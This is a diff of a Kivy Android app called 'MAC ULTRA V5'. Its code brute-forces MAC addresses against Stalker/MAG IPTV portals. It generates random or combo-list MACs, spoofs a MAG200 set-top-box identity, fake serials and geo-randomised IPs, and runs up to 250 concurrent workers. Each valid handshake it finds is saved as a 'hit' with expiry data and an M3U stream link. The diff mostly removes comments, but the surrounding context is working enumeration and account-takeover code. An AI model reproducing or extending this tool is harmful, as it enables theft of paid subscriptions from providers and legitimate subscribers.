@@ -58,7 +58,7 @@ class StyledButton(Button):
         self.bind(pos=self.update_rect, size=self.update_rect)
     def update_rect(self, *a): self.rect.pos, self.rect.size = self.pos, self.size
 
-# --- FAVORITEN SEITE ---
+# --- FAVORITEN SEITE (PortalManagerView) ---
 class PortalManagerView(ModalView):
     def __init__(self, main_screen, **kwargs):
         super().__init__(**kwargs)
@@ -79,7 +79,6 @@ class PortalManagerView(ModalView):
         add_box.add_widget(self.new_portal); add_box.add_widget(btn_row)
         layout.add_widget(add_box)
 
-        # Listen Überschriften (Punkt 2)
         header = BoxLayout(size_hint_y=None, height=35)
         header.add_widget(Label(text="[color=FFFF00][b]MAC LISTE[/b][/color]", markup=True))
         header.add_widget(Label(text="[color=00FFFF][b]M3U LISTE[/b][/color]", markup=True))
@@ -134,7 +133,7 @@ class MagUltraScreen(Screen):
         super().__init__(**kw)
         self.context = context
         self.hits, self.checked, self.running = 0, 0, False
-        self.total_lines = 0 # Punkt 1
+        self.total_lines = 0
         self.request_count, self.error_streak = 0, 0
         self.hit_list, self.last_status, self.start_time = [], "READY", time.time()
         self.setup_ui()
@@ -165,12 +164,10 @@ class MagUltraScreen(Screen):
         row_cfg.add_widget(self.scan_mode); row_cfg.add_widget(self.prefix_spinner)
         self.combo_spinner = Spinner(text="SELECT COMBO", values=self.load_list("/sdcard/Combo/"), height=45)
         
-        # Delay Label & Slider (Punkt 4 & 5)
         self.delay_label = Label(text="DELAY: 1.0s", size_hint_y=None, height=20, color=YELLOW)
         self.delay_slider = Slider(min=0, max=5, value=1.0, step=0.1)
         self.delay_slider.bind(value=lambda i, v: setattr(self.delay_label, "text", f"DELAY: {v:.1f}s"))
         
-        # Bot Label & Slider (Punkt 3 & 5)
         self.bot_label = Label(text="BOTS: 40", size_hint_y=None, height=20, color=CYAN)
         self.bot_slider = Slider(min=1, max=250, value=40, step=1)
         self.bot_slider.bind(value=lambda i, v: setattr(self.bot_label, "text", f"BOTS: {int(v)}"))
@@ -206,7 +203,7 @@ class MagUltraScreen(Screen):
         lbl = Label(text=v, font_size="20sp", bold=True, color=c)
         box.add_widget(lbl); p.add_widget(box); return lbl
 
-    # --- ENGINE ---
+    # --- V5 ENGINE CORE ---
     def get_clean_time(self, raw):
         raw_str = str(raw).strip()
         if not raw_str or raw_str.lower() in ["none", "false", "0", "null"]: return "Unlimited", "Unlimited"
@@ -232,7 +229,6 @@ class MagUltraScreen(Screen):
         final_dir = "/storage/emulated/0/Hits/MAC-ULTRA-V5/"
         os.makedirs(final_dir, exist_ok=True)
         m3u = f"{portal}/get.php?mac={id_val}&type=m3u_plus&output=ts" if not is_m3u else f"{portal}/get.php?username={id_val}&password={pw}&type=m3u_plus&output=ts"
-        
         box = f"""━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   🛰️ 𝗠𝗔𝗖 𝗨𝗟𝗧𝗥𝗔 𝗩𝟱 𝗛𝗜𝗧
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -258,13 +254,10 @@ class MagUltraScreen(Screen):
   🔗 𝗠𝟯𝗨 𝗟𝗜𝗡𝗞:
   {m3u}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  🛰️ MAC ULTRA Scan: {time.strftime('%H:%M / %d.%m.%Y')}\n\n""" # Punkt 6
-
-        # Optionale Listen (Punkt 7)
+  🛰️ MAC ULTRA Scan: {time.strftime('%H:%M / %d.%m.%Y')}\n\n"""
         if l_list: box += f" 📂 𝗟𝗜𝗩𝗘 𝗟𝗜𝗦𝗧\n ╚┈❲ {l_list} ❳\n\n"
         if m_list: box += f" 🎬 𝗠𝗢𝗩𝗜𝗘 𝗟𝗜𝗦𝗧\n ╚┈❲ {m_list} ❳\n\n"
         if s_list: box += f" 🎞️ 𝗦𝗘𝗥𝗜𝗘𝗦 𝗟𝗜𝗦𝗧\n ╚┈❲ {s_list} ❳\n\n"
-        
         with open(os.path.join(final_dir, f"{domain}.txt"), "a", encoding="utf-8") as f: f.write(box)
 
     async def process_check(self, mac, portal, client):
@@ -272,7 +265,6 @@ class MagUltraScreen(Screen):
             geo_i = GEO_DATA.get(self.country_filter.text.upper(), GEO_DATA['DE'])
             ip_fake = f"{random.choice(geo_i['ip'])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(2,254)}"
             dev_id = str(uuid.uuid4()).replace('-', '')[:32].upper()
-            
             headers = {
                 'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721',
                 'X-STB-SN': f"MACULTRA{random.randint(1000,9999)}",
@@ -281,16 +273,13 @@ class MagUltraScreen(Screen):
                 'Cookie': f"mac={urllib.parse.quote(mac)}; stb_lang=en; timezone={urllib.parse.quote(geo_i['tz'])};",
                 'JsHttpRequest': '1-xml'
             }
-
             r = await client.get(f"{portal}/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml", headers=headers)
             self.last_status = str(r.status_code)
-            
             if r.status_code == 200 and 'token' in r.text:
                 token = r.json().get('js', {}).get('token')
                 headers['Authorization'] = f'Bearer {token}'
                 ri = await client.get(f"{portal}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml", headers=headers)
                 self.last_status = str(ri.status_code)
-                
                 if ri.status_code == 200:
                     js = ri.json().get('js', {})
                     exp, days = self.get_clean_time(js.get('end_date') or js.get('phone') or "Unlimited")
@@ -308,7 +297,6 @@ class MagUltraScreen(Screen):
         portals = [self.portal_input.text.strip().rstrip('/')]
         if self.portal_file_spinner.text != "USE SINGLE":
             with open(f"/storage/emulated/0/Portals/{self.portal_file_spinner.text}", 'r') as f: portals = [l.strip().rstrip('/') for l in f if l.strip()]
-
         async with httpx.AsyncClient(verify=False, timeout=12) as client:
             for portal in portals:
                 if not self.running: break
@@ -316,23 +304,18 @@ class MagUltraScreen(Screen):
                     res = await client.get(f"http://ip-api.com/json/{portal.split('//')[-1].split(':')[0]}")
                     info = res.json(); srv_info = f"{info.get('isp','N/A')} ({info.get('country','N/A')})"
                 except: srv_info = "N/A"
-                
                 self.update_log_safe(f"[color=00FFFF][INFO][/color] Server: {portal} | ISP: {srv_info}")
-                
                 if self.scan_mode.text == "COMBO FILE":
                     with open(f"/sdcard/Combo/{self.combo_spinner.text}", 'r', errors='ignore') as f: combo = [l.strip() for l in f if l.strip()]
                 else:
                     pfx = self.prefix_spinner.text if ":" in self.prefix_spinner.text else "00:1A:79:"
                     combo = [f"{pfx}{':'.join([f'{random.randint(0,255):02x}' for _ in range(3)])}" for _ in range(1000)]
-
                 self.total_lines, self.checked, self.start_time = len(combo), 0, time.time()
                 Clock.schedule_once(lambda dt: setattr(self.pbar, 'max', self.total_lines))
-                
                 queue = asyncio.Queue()
                 for l in combo: queue.put_nowait(l)
                 workers = [self.worker(queue, portal, client) for _ in range(int(self.bot_slider.value))]
                 await asyncio.gather(*workers)
-
         self.running = False; Clock.schedule_once(lambda dt: setattr(self.start_btn, 'text', "START MAC ULTRA"))
 
     async def worker(self, queue, portal, client):
